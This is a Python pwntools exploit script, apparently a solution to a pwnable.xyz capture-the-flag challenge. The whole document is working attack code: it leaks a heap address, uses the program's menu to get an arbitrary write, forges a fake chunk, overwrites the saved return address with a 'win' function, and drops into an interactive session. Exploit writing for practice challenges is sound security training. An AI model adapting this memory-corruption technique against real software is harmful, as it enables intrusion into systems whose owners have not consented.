from pwn import *

p = remote("svc.pwnable.xyz", 30005)

SA = lambda data : p.sendafter(b">", data)
S = lambda data : p.send(data)

win_addr = 0x00400a3e
fakeChunk_addr = 0x00601050

# Calculate &returnAddr from leaked &pHeapChunk
SA(b"0" * 0x2f + b"2")
pHeapChunk_addr = int(p.recvline(), 16)
returnAddr_addr = pHeapChunk_addr + 0x58
print(f"&pHeapChunk: {pHeapChunk_addr:016x}")
print(f"&returnAddr: {returnAddr_addr:016x}")

SA(b"0" * 0x2f + b"1")
S(p64(0) + p64(returnAddr_addr)) # *(pHeapChunk + 8) = &returnAddr

SA(b"0" * 0x2f + b"3") # pHeapChunk = &returnAddr
SA(b"0" * 0x2f + b"1")
S(p64(win_addr) + p64(fakeChunk_addr - 8)) # *pHeapChunk = &win, *(pHeapChunk + 8) = &fakeChunk - 8

SA(b"0" * 0x2f + b"3") # pHeapChunk = &fakeChunk - 8
SA(b"0" * 0x2f + b"1")
S(p64(0x40) + p64(fakeChunk_addr)) # *pheapChunk = 0x40, *(pHeapChunk + 8) = &fakeChunk

SA(b"0" * 0x2f + b"3") # pHeapChunk = &fakeChunk
SA(b"0" * 0x2f + b"0") # exit :)

p.interactive()